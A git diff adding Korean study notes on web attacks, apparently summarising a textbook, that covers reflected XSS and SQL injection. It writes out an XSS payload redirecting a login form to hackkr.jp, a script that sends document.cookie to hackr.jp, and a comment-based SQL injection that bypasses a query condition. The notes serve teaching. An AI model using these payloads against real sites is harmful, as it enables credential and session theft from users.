@@ -56,4 +56,47 @@
 ![](https://3.bp.blogspot.com/-h8DgNsx8zhY/WCHPxBD4txI/AAAAAAAAC18/aMZJ85_yJU0vMYl8puDJZCDjJtlVYenFwCLcB/s1600/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA%2B2016-11-08%2B%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE%2B10.14.22.png)
 
 > 예시) 폼에 `<script>` 태그를 사용한 문자열을 입력하여 공격
-#### XSS는 공격자가 함정을 준비하는 수동적 공격
+**XSS는 공격자가 함정을 준비하는 수동적 공격**
+- 예) URL의 쿼리에 ID를 지정함으로써 폼 내에 문자열을 보완하는 기능이 있는 웹사이트
+  ```
+  http://example.jp/login?ID=yama
+  ```
+  여기에 취약성이 있다고 파악한 공격자는 다음과 같은 함정을 작성한 후 교모한 내용의 메일이나 함정을 설치한 웹 페이지를 준비해서 유저가 URL을 클릭하도록 유도한다.
+  ```javascript
+  http://example.jp/login?ID="><script>var+f=document=>getElementById("login");+f.action="http://hackkr.jp/pwget";+f.method==>"get";</script><span+s="
+  ```
+  유저가 폼에 ID와 패스워드를 입력하면 공격자의 사이트로 송신되게 하여 빼앗을 수 있다.
+
+#### 유저의 쿠키를 빼앗는 공격
+- 폼에 함정을 설치하는 것 외에도 아래와 같은 스크립트를 추가하여 유저의 쿠키를 XSS로 빼앗을 수 있다.
+  ```javascript
+  <script src="http://hackr.jp/xss.js></script>
+  ```
+- 이 스크립트가 가리키는 http://hackr.jp/xss.js에는 아래의 JavaScript가 코딩되어 이다.
+  ```javascript
+  var content = escape(document.cookie);
+  document.write("<img src="http://hackr.jp/?");
+  document.write(content);
+  document.write(">");
+  ```
+- XSS 취약성이 있는 웹 애플리케이션에서 JavaScript가 실행되면 해당 웹 애플리케이션의 도메인의 쿠키 정보에 액세스된다. 그리고 이 저보가 웹 사이트에 보내지고 액세스 로그에 기록된다.
+
+### 11.2.2 SQL 인젝션
+#### 부정한 SQL을 실행하는 SQL 인젝션
+- SQL 인젝션 : 웹 애플리케이션을 이용하고 있는 데이터베이스에 SQL을 부정하게 실행하는 공격
+- 커다란 위협을 일으킬 수 있는 취약성
+
+**SQL 인젝션의 공격 사례**
+- 웹 사이트에 [우에노 센]을 입력했을 때 이 값은 웹 애플리케이션 내부에서 SQL문에 전달되며 다음과 같이 구성된다.
+  ```sql
+  SELECT * FROM bookTbl WHERE author='우에노 센' and flag = 1;
+  ```
+- 조금 전 쿼리를 "우에노 센'--"으로 변경한다.
+- 그럼 SQL문은 다음과 같이 구성된다.
+  ```sql
+  SELECT * FROM bookTbl WHERE author='우에노 센' --' and flag = 1;
+  ```
+- SQL문에서 "--" 이후는 주석으로 처리된다. 즉, `and flag=1`이라는 조건이 무시된다.
+
+#### SQL 인젝션은 SQL 문장의 구문을 파괴하는 공격
+- SQL 인젝션은 공격자에 의해 개발자가 의도하지 않는 형태로 SQL 문장이 변경되어 구조가 파괴되는 공격
